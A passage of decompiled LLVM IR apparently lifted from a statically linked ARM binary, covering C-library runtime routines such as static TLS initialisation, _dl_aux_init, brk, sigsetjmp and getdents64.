  %v0_17f10 = load i32, i32* @r5, align 4
  store i32 %v0_17f10, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_17f10, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_13808.559 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_17f24 = load i32, i32* %sl.global-to-local, align 4
  %v2_17f24 = add i32 %v0_17f24, 84
  %v3_17f24 = inttoptr i32 %v2_17f24 to i32*
  %v4_17f24 = load i32, i32* %v3_17f24, align 4
  store i32 %v4_17f24, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10748, i32* %r1.global-to-local, align 4
  %v2_17f30 = add i32 %v0_17f24, 60
  %v3_17f30 = inttoptr i32 %v2_17f30 to i32*
  %v4_17f30 = load i32, i32* %v3_17f30, align 4
  store i32 %v4_17f30, i32* %r0.global-to-local, align 4
  %v3_17f38 = add i32 %v0_17f24, 10748
  %v4_17f38 = inttoptr i32 %v3_17f38 to i32*
  store i32 64, i32* %v4_17f38, align 4
  %v1_17f40 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f40 = add i32 %v1_17f40, 20
  %v3_17f40 = inttoptr i32 %v2_17f40 to i32*
  store i32 %stack_var_-44.3, i32* %v3_17f40, align 4
  %v1_17f48 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f48 = add i32 %v1_17f48, 24
  %v3_17f48 = inttoptr i32 %v2_17f48 to i32*
  store i32 %stack_var_-48.3, i32* %v3_17f48, align 4
  %v1_17f50 = load i32, i32* %r0.global-to-local, align 4
  %v2_17f50 = inttoptr i32 %v1_17f50 to i32*
  store i32 1, i32* %v2_17f50, align 4
  %v1_17f58 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f58 = add i32 %v1_17f58, 28
  %v3_17f58 = inttoptr i32 %v2_17f58 to i32*
  store i32 %stack_var_-52.3, i32* %v3_17f58, align 4
  %v0_17f60 = load i32, i32* @r6, align 4
  %v2_17f60 = icmp eq i32 %v0_17f60, 0
  %v1_17f64 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f64 = add i32 %v1_17f64, 44
  %v3_17f64 = inttoptr i32 %v2_17f64 to i32*
  store i32 1, i32* %v3_17f64, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_17f6c = load i32, i32* %sl.global-to-local, align 4
  %v1_17f6c = load i32, i32* %r1.global-to-local, align 4
  %v2_17f6c = add i32 %v1_17f6c, %v0_17f6c
  store i32 %v2_17f6c, i32* %r2.global-to-local, align 4
  %v1_17f70 = load i32, i32* @r6, align 4
  br i1 %v2_17f60, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_17e84
  store i32 %v1_17f70, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_17f7c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f7c35 = add i32 %v1_17f7c34, 32
  %v3_17f7c36 = inttoptr i32 %v2_17f7c35 to i32*
  store i32 %v1_17f70, i32* %v3_17f7c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_17e84
  %v2_17f74 = add i32 %v1_17f70, -1
  store i32 %v2_17f74, i32* %r0.global-to-local, align 4
  %v1_17f7c = load i32, i32* %r8.global-to-local, align 4
  %v2_17f7c = add i32 %v1_17f7c, 32
  %v3_17f7c = inttoptr i32 %v2_17f7c to i32*
  store i32 %v1_17f70, i32* %v3_17f7c, align 4
  %v1_17f80 = load i32, i32* @r6, align 4
  store i32 %v1_17f80, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_17f84 = load i32, i32* %r8.global-to-local, align 4
  %v1_17f84 = load i32, i32* %r2.global-to-local, align 4
  %v2_17f84 = add i32 %v1_17f84, 28
  %v3_17f84 = inttoptr i32 %v2_17f84 to i32*
  store i32 %v0_17f84, i32* %v3_17f84, align 4
  %v0_17f88 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f88 = load i32, i32* %ip.global-to-local, align 4
  %v2_17f88 = inttoptr i32 %v1_17f88 to i32*
  store i32 %v0_17f88, i32* %v2_17f88, align 4
  %v0_17f8c = load i32, i32* %r0.global-to-local, align 4
  %v1_17f8c = load i32, i32* %r3.global-to-local, align 4
  %v2_17f8c = add i32 %v1_17f8c, %v0_17f8c
  store i32 %v2_17f8c, i32* %r0.global-to-local, align 4
  %v1_17f90 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_17f60, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_17f98.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_17f98 = phi i32 [ %v0_17f98.pre, %._crit_edge ], [ %v1_17f90, %bb54 ]
  %v2_17f94 = udiv i32 %v2_17f8c, %v1_17f90
  %v2_17f98 = load i32, i32* %sb.global-to-local, align 4
  %v3_17f98 = mul i32 %v2_17f94, %v0_17f98
  %v4_17f98 = add i32 %v2_17f98, %v3_17f98
  store i32 %v4_17f98, i32* @r0, align 4
  %v0_17f9c = load i32, i32* %fp.global-to-local, align 4
  %v2_17f9c = icmp ult i32 %v0_17f9c, 16
  %v0_17f9c. = select i1 %v2_17f9c, i32 16, i32 %v0_17f9c
  store i32 %v0_17f9c., i32* @r1, align 4
  %v2_17fac = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17fac, i32* @r4, align 4
  store i32 %v6_17dc8, i32* @r5, align 4
  store i32 %v15_17dc8, i32* %r8.global-to-local, align 4
  store i32 %v18_17dc8, i32* %sb.global-to-local, align 4
  store i32 %v21_17dc8, i32* %sl.global-to-local, align 4
  store i32 %v24_17dc8, i32* %fp.global-to-local, align 4
  store i32 %v27_17dc8, i32* @lr, align 4
  %v0_17fb0 = call i32 @init_static_tls()
  store i32 %v0_17fb0, i32* %r0.global-to-local, align 4
  %v0_17fbc.pre = load i32, i32* @ip, align 4
  %v1_17e84.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_17e94.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17fb4

dec_label_pc_17e40.dec_label_pc_17fb4.loopexit_crit_edge: ; preds = %dec_label_pc_17e3c
  br label %dec_label_pc_17fb4.loopexit

dec_label_pc_17fb4.loopexit:                      ; preds = %dec_label_pc_17e40.dec_label_pc_17fb4.loopexit_crit_edge, %dec_label_pc_17df4
  br label %dec_label_pc_17fb4

dec_label_pc_17fb4:                               ; preds = %dec_label_pc_17fb4.loopexit, %entry, %bb55
  %v0_17e94.pre.pre = phi i32 [ ptrtoint (i32* @global_var_22204.365 to i32), %dec_label_pc_17fb4.loopexit ], [ ptrtoint (i32* @global_var_22204.365 to i32), %entry ], [ %v0_17e94.pre.pre.pre, %bb55 ]
  %v1_17e84.pre.pre = phi i32 [ %v0_17de8, %dec_label_pc_17fb4.loopexit ], [ %v0_17de8, %entry ], [ %v1_17e84.pre.pre.pre, %bb55 ]
  %v0_17fbc = phi i32 [ %v0_17dec, %dec_label_pc_17fb4.loopexit ], [ %v0_17dec, %entry ], [ %v0_17fbc.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_17fbc, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17e80

; uselistorder directives
  uselistorder i32 %v0_17fbc, { 1, 0 }
  uselistorder i32 %v1_17f70, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17edc, { 1, 0 }
  uselistorder i32 %v2_17ed8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_17e3c, { 2, 1, 0 }
  uselistorder i32 %v3_17e14, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_17e1c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_17e40, { 1, 0 }
  uselistorder i32 %v0_17dec, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_17de8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17ddc, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10748, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_17fb4, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_17e84, { 1, 0 }
  uselistorder label %dec_label_pc_17e80, { 1, 0 }
  uselistorder label %dec_label_pc_17e04, { 1, 0 }
}

define i32 @function_17fd4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17fd4:
  %v0_17fd4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17fd4, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_17fd4
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_17fd4
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_18000 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_18000
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r2.global-to-local, align 4
  %v4_18010 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 156) to i32*), align 4
  %v4_18018 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 104) to i32*), align 4
  store i32 %v4_18018, i32* %r1.global-to-local, align 4
  %v1_1801c = add i32 %arg1, 44
  %v2_1801c = inttoptr i32 %v1_1801c to i32*
  %v3_1801c = load i32, i32* %v2_1801c, align 4
  %v1_18020 = add i32 %arg1, 28
  %v2_18020 = inttoptr i32 %v1_18020 to i32*
  %v3_18020 = load i32, i32* %v2_18020, align 4
  store i32 %v3_18020, i32* %r2.global-to-local, align 4
  %v2_18024 = inttoptr i32 %v4_18010 to i32*
  store i32 %v3_1801c, i32* %v2_18024, align 4
  %v0_18028 = load i32, i32* %r2.global-to-local, align 4
  %v1_18028 = load i32, i32* %r1.global-to-local, align 4
  %v2_18028 = inttoptr i32 %v1_18028 to i32*
  store i32 %v0_18028, i32* %v2_18028, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 4, 6, 3, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_18034(i32 %arg1) local_unnamed_addr {
dec_label_pc_18034:
  %v0_18034 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18034, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18034
  %v1_18034 = load i32, i32* @ip, align 4
  %v3_18034 = mul i32 %v1_18034, %arg1
  %v2_18038 = load i32, i32* @r8, align 4
  %v4_18038 = and i32 %v2_18038, %v3_18034
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18034, %bb
  %v5_18038 = phi i32 [ %arg1, %dec_label_pc_18034 ], [ %v4_18038, %bb ]
  ret i32 %v5_18038

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_18044 = add i32 %arg1, 40
  store i32 %v1_18044, i32* %r2.global-to-local, align 4
  %v1_18048 = inttoptr i32 %v1_18044 to i32*
  %v2_18048 = load i32, i32* %v1_18048, align 4
  store i32 %v2_18048, i32* %r2.global-to-local, align 4
  %v3_18048 = add i32 %arg1, 44
  %v4_18048 = inttoptr i32 %v3_18048 to i32*
  %v5_18048 = load i32, i32* %v4_18048, align 4
  store i32 %v5_18048, i32* %r3.global-to-local, align 4
  %v0_1804c = call i32 @__aeabi_read_tp()
  %v1_18050 = inttoptr i32 %v0_1804c to i32*
  %v2_18050 = load i32, i32* %v1_18050, align 4
  store i32 %v2_18050, i32* %r1.global-to-local, align 4
  %v3_18054 = mul i32 %v5_18048, 8
  store i32 %v3_18054, i32* %r3.global-to-local, align 4
  %v1_18058 = load i32, i32* %r2.global-to-local, align 4
  %v2_18058 = add i32 %v1_18058, %v0_1804c
  %v3_1805c = add i32 %v3_18054, %v2_18050
  %v4_1805c = inttoptr i32 %v3_1805c to i32*
  store i32 %v2_18058, i32* %v4_1805c, align 4
  %v0_18060 = load i32, i32* %r3.global-to-local, align 4
  %v1_18060 = load i32, i32* %r1.global-to-local, align 4
  %v2_18060 = add i32 %v1_18060, %v0_18060
  store i32 %v2_18060, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_18068 = add i32 %v2_18060, 4
  %v5_18068 = inttoptr i32 %v4_18068 to i8*
  store i8 1, i8* %v5_18068, align 1
  %v0_1806c = load i32, i32* @r4, align 4
  %v1_1806c = add i32 %v0_1806c, 20
  store i32 %v1_1806c, i32* %r1.global-to-local, align 4
  %v1_18070 = inttoptr i32 %v1_1806c to i32*
  %v2_18070 = load i32, i32* %v1_18070, align 4
  store i32 %v2_18070, i32* @r1, align 4
  %v3_18070 = add i32 %v0_1806c, 24
  %v4_18070 = inttoptr i32 %v3_18070 to i32*
  %v5_18070 = load i32, i32* %v4_18070, align 4
  store i32 %v5_18070, i32* %r2.global-to-local, align 4
  %v5_18074 = call i32 @__GI_mempcpy(i32 %v2_18058, i32 %v2_18070, i32 %v5_18070, i32 1)
  %v0_18078 = load i32, i32* @r4, align 4
  %v1_18078 = add i32 %v0_18078, 28
  store i32 %v1_18078, i32* %r3.global-to-local, align 4
  %v1_1807c = inttoptr i32 %v1_18078 to i32*
  %v2_1807c = load i32, i32* %v1_1807c, align 4
  store i32 %v2_1807c, i32* %r2.global-to-local, align 4
  %v3_1807c = add i32 %v0_18078, 24
  %v4_1807c = inttoptr i32 %v3_1807c to i32*
  %v5_1807c = load i32, i32* %v4_1807c, align 4
  store i32 %v5_1807c, i32* %r3.global-to-local, align 4
  %v2_18080 = sub i32 %v5_1807c, %v2_1807c
  store i32 %v2_18080, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18088 = inttoptr i32 %v5_18074 to i8*
  %v4_18088 = call i32 @__GI_memset(i8* %v3_18088, i32 0, i32 %v2_18080)
  ret i32 %v4_18088

; uselistorder directives
  uselistorder i32 %v3_18054, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 11, 10, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_180d8:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 11576) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_180ec = load i32, i32* @r0, align 4
  %v1_180f0 = inttoptr i32 %v0_180ec to i32*
  %v2_180f0 = load i32, i32* @r4, align 4
  store i32 %v2_180f0, i32* %v1_180f0, align 4
  %v3_180f0 = add i32 %v0_180ec, 4
  %v4_180f0 = inttoptr i32 %v3_180f0 to i32*
  %v5_180f0 = load i32, i32* @r5, align 4
  store i32 %v5_180f0, i32* %v4_180f0, align 4
  %v6_180f0 = add i32 %v0_180ec, 8
  %v7_180f0 = inttoptr i32 %v6_180f0 to i32*
  %v8_180f0 = load i32, i32* @r6, align 4
  store i32 %v8_180f0, i32* %v7_180f0, align 4
  %v9_180f0 = add i32 %v0_180ec, 12
  %v10_180f0 = inttoptr i32 %v9_180f0 to i32*
  %v11_180f0 = load i32, i32* @r7, align 4
  store i32 %v11_180f0, i32* %v10_180f0, align 4
  %v12_180f0 = add i32 %v0_180ec, 16
  %v13_180f0 = inttoptr i32 %v12_180f0 to i32*
  %v14_180f0 = load i32, i32* @r8, align 4
  store i32 %v14_180f0, i32* %v13_180f0, align 4
  %v15_180f0 = add i32 %v0_180ec, 20
  %v16_180f0 = inttoptr i32 %v15_180f0 to i32*
  %v17_180f0 = load i32, i32* @sb, align 4
  store i32 %v17_180f0, i32* %v16_180f0, align 4
  %v18_180f0 = add i32 %v0_180ec, 24
  %v19_180f0 = inttoptr i32 %v18_180f0 to i32*
  %v20_180f0 = load i32, i32* @sl, align 4
  store i32 %v20_180f0, i32* %v19_180f0, align 4
  %v21_180f0 = add i32 %v0_180ec, 28
  %v22_180f0 = inttoptr i32 %v21_180f0 to i32*
  %v23_180f0 = load i32, i32* @fp, align 4
  store i32 %v23_180f0, i32* %v22_180f0, align 4
  %v24_180f0 = add i32 %v0_180ec, 32
  %v25_180f0 = inttoptr i32 %v24_180f0 to i32*
  %v27_180f0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_180f0, i32* %v25_180f0, align 4
  %v28_180f0 = add i32 %v0_180ec, 36
  %v29_180f0 = inttoptr i32 %v28_180f0 to i32*
  %v30_180f0 = load i32, i32* @lr, align 4
  store i32 %v30_180f0, i32* %v29_180f0, align 4
  %v0_180f4 = call i32 @__sigjmp_save()
  ret i32 %v0_180f4

; uselistorder directives
  uselistorder i32 %v0_180ec, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 109, 110, 13, 14, 15, 16, 17, 18, 19, 20, 97, 98, 99, 100, 101, 103, 102, 104, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 3, 0, 1, 2, 4, 5, 6, 7, 8, 41, 40, 46, 47, 42, 43, 44, 45, 21, 22, 23, 24, 25, 26, 27, 28, 29, 48, 49, 50, 51, 52, 53, 54, 55, 9, 10, 11, 12, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 69, 67, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 87, 85, 86, 88, 89, 90, 91, 92, 93, 94, 95, 96, 105, 106, 107, 108 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_180fc = load i32, i32* @r5, align 4
  %v12_180fc = load i32, i32* @r7, align 4
  %v1_18100 = add i32 %arg3, 14
  %v2_18108 = ptrtoint i32* %stack_var_-72 to i32
  %v1_1810c = and i32 %v1_18100, -8
  %v2_18110 = sub i32 %v2_18108, %v1_1810c
  %v1_18114 = add i32 %v2_18110, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_18158, label %dec_label_pc_1813c

dec_label_pc_1813c:                               ; preds = %entry
  %v1_18140 = sub i32 0, %arg1
  %v3_18144 = load i16, i16* @global_var_2225c.361, align 2
  %v4_18144 = sext i16 %v3_18144 to i32
  %v0_18148 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_18150 = add i32 %v4_18144, %v0_18148
  %v4_18150 = inttoptr i32 %v3_18150 to i32*
  store i32 %v1_18140, i32* %v4_18150, align 4
  br label %dec_label_pc_18228

dec_label_pc_18158:                               ; preds = %entry
  br i1 false, label %dec_label_pc_18228, label %dec_label_pc_18160

dec_label_pc_18160:                               ; preds = %dec_label_pc_18158
  %v2_18160 = add i32 %v1_18114, %arg1
  store i32 %v2_18160, i32* %r1.global-to-local, align 4
  %v2_18164 = add i32 %tmp, %arg3
  store i32 %v1_18114, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18210

dec_label_pc_18180:                               ; preds = %dec_label_pc_18210
  %v1_18180 = add i32 %v0_181e0, 16
  %v2_18180 = inttoptr i32 %v1_18180 to i16*
  %v3_18180 = load i16, i16* %v2_18180, align 2
  %v4_18180 = zext i16 %v3_18180 to i32
  %v1_18184 = add nsw i32 %v4_18180, -19
  store i32 %v1_18184, i32* @r2, align 4
  %v1_18188 = add nuw nsw i32 %v4_18180, 7
  %v1_1818c = and i32 %v1_18188, 131064
  store i32 %v1_1818c, i32* @ip, align 4
  %v2_18194 = add i32 %v1_1818c, %v0_181e8
  store i32 %v2_18194, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_18194, %v2_18164
  br i1 %tmp24, label %dec_label_pc_181a0, label %dec_label_pc_181dc

dec_label_pc_181a0:                               ; preds = %dec_label_pc_18180
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_181a8 = load i32, i32* %r8.global-to-local, align 4
  %v0_181ac = load i32, i32* %sb.global-to-local, align 4
  %v1_181b0 = load i32, i32* @sp, align 4
  %v2_181b0 = inttoptr i32 %v1_181b0 to i32*
  store i32 0, i32* %v2_181b0, align 4
  %v4_181b4 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_181a8, i32 %v0_181ac)
  %v0_181b8 = load i32, i32* @r5, align 4
  %v1_181b8 = load i32, i32* %sl.global-to-local, align 4
  %v9_181b8 = icmp eq i32 %v0_181b8, %v1_181b8
  br i1 %v9_181b8, label %dec_label_pc_181c0, label %dec_label_pc_18224

dec_label_pc_181c0:                               ; preds = %dec_label_pc_181a0
  %v0_181c4 = call i32 @__aeabi_read_tp()
  %v3_181c8 = load i16, i16* @global_var_2225c.361, align 2
  %v4_181c8 = sext i16 %v3_181c8 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_181d4 = add i32 %v4_181c8, %v0_181c4
  %v4_181d4 = inttoptr i32 %v3_181d4 to i32*
  store i32 22, i32* %v4_181d4, align 4
  br label %dec_label_pc_18228

dec_label_pc_181dc:                               ; preds = %dec_label_pc_18180
  %v1_181dc = inttoptr i32 %v0_181e0 to i32*
  %v2_181dc = load i32, i32* %v1_181dc, align 4
  %v3_181dc = add i32 %v0_181e0, 4
  %v4_181dc = inttoptr i32 %v3_181dc to i32*
  %v5_181dc = load i32, i32* %v4_181dc, align 4
  store i32 %v5_181dc, i32* @r4, align 4
  %v1_181e0 = add i32 %v0_181e0, 8
  store i32 %v1_181e0, i32* %r8.global-to-local, align 4
  %v1_181e4 = inttoptr i32 %v1_181e0 to i32*
  %v2_181e4 = load i32, i32* %v1_181e4, align 4
  store i32 %v2_181e4, i32* %r8.global-to-local, align 4
  %v3_181e4 = add i32 %v0_181e0, 12
  %v4_181e4 = inttoptr i32 %v3_181e4 to i32*
  %v5_181e4 = load i32, i32* %v4_181e4, align 4
  store i32 %v5_181e4, i32* %sb.global-to-local, align 4
  %v1_181e8 = inttoptr i32 %v0_181e8 to i32*
  store i32 %v2_181dc, i32* %v1_181e8, align 4
  %v3_181e8 = add i32 %v0_181e8, 4
  %v4_181e8 = inttoptr i32 %v3_181e8 to i32*
  %v5_181e8 = load i32, i32* @r4, align 4
  store i32 %v5_181e8, i32* %v4_181e8, align 4
  %v0_181ec = load i32, i32* %r8.global-to-local, align 4
  %v1_181ec = load i32, i32* @r5, align 4
  %v2_181ec = add i32 %v1_181ec, 8
  %v3_181ec = inttoptr i32 %v2_181ec to i32*
  store i32 %v0_181ec, i32* %v3_181ec, align 4
  %v0_181f0 = load i32, i32* %sb.global-to-local, align 4
  %v1_181f0 = load i32, i32* @r5, align 4
  %v2_181f0 = add i32 %v1_181f0, 12
  %v3_181f0 = inttoptr i32 %v2_181f0 to i32*
  store i32 %v0_181f0, i32* %v3_181f0, align 4
  %v0_181f4 = load i32, i32* @ip, align 4
  %v1_181f4 = trunc i32 %v0_181f4 to i16
  %v2_181f4 = load i32, i32* @r5, align 4
  %v3_181f4 = add i32 %v2_181f4, 16
  %v4_181f4 = inttoptr i32 %v3_181f4 to i16*
  store i16 %v1_181f4, i16* %v4_181f4, align 2
  %v0_181f8 = load i32, i32* @r7, align 4
  %v1_181f8 = add i32 %v0_181f8, 18
  %v2_181f8 = inttoptr i32 %v1_181f8 to i8*
  %v3_181f8 = load i8, i8* %v2_181f8, align 1
  %v4_181f8 = zext i8 %v3_181f8 to i32
  store i32 %v4_181f8, i32* @r3, align 4
  %v2_181fc = load i32, i32* @r5, align 4
  %v3_181fc = add i32 %v2_181fc, 18
  %v4_181fc = inttoptr i32 %v3_181fc to i8*
  store i8 %v3_181f8, i8* %v4_181fc, align 1
  %v0_18200 = call i32 @memcpy()
  %v0_18204 = load i32, i32* @r7, align 4
  %v1_18204 = add i32 %v0_18204, 16
  %v2_18204 = inttoptr i32 %v1_18204 to i16*
  %v3_18204 = load i16, i16* %v2_18204, align 2
  %v4_18204 = zext i16 %v3_18204 to i32
  %v0_18208 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18208, i32* @r5, align 4
  %v2_1820c = add i32 %v4_18204, %v0_18204
  store i32 %v2_1820c, i32* @r7, align 4
  br label %dec_label_pc_18210

dec_label_pc_18210:                               ; preds = %dec_label_pc_18160, %dec_label_pc_181dc
  %v0_181e8 = phi i32 [ %tmp, %dec_label_pc_18160 ], [ %v0_18208, %dec_label_pc_181dc ]
  %v0_181e0 = phi i32 [ %v1_18114, %dec_label_pc_18160 ], [ %v2_1820c, %dec_label_pc_181dc ]
  %v3_18214 = icmp ult i32 %v0_181e0, %v2_18160
  %v1_18218 = add i32 %v0_181e8, 19
  store i32 %v1_18218, i32* @r0, align 4
  %v1_1821c = add i32 %v0_181e0, 19
  store i32 %v1_1821c, i32* @r1, align 4
  br i1 %v3_18214, label %dec_label_pc_18180, label %dec_label_pc_18224.loopexit

dec_label_pc_18224.loopexit:                      ; preds = %dec_label_pc_18210
  %v0_18224.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18224

dec_label_pc_18224:                               ; preds = %dec_label_pc_18224.loopexit, %dec_label_pc_181a0
  %v1_18224 = phi i32 [ %v0_181e8, %dec_label_pc_18224.loopexit ], [ %v0_181b8, %dec_label_pc_181a0 ]
  %v0_18224 = phi i32 [ %v0_18224.pre, %dec_label_pc_18224.loopexit ], [ %v1_181b8, %dec_label_pc_181a0 ]
  %v2_18224 = sub i32 %v1_18224, %v0_18224
  store i32 %v2_18224, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18228

dec_label_pc_18228:                               ; preds = %dec_label_pc_18158, %dec_label_pc_181c0, %dec_label_pc_1813c, %dec_label_pc_18224
  %v0_18228 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_180fc, i32* @r5, align 4
  store i32 %v12_180fc, i32* @r7, align 4
  ret i32 %v0_18228

; uselistorder directives
  uselistorder i32 %v0_181e0, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_181e8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_18114, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 7, 8, 0, 3, 9, 10, 11, 4, 5, 6, 1, 12, 2, 13 }
  uselistorder i32 18, { 5, 6, 4, 7, 0, 8, 1, 9, 2, 10, 3, 11 }
  uselistorder i32 22, { 1, 0, 11, 2, 3, 4, 5, 6, 12, 13, 7, 8, 9, 10 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_18228, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18210, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
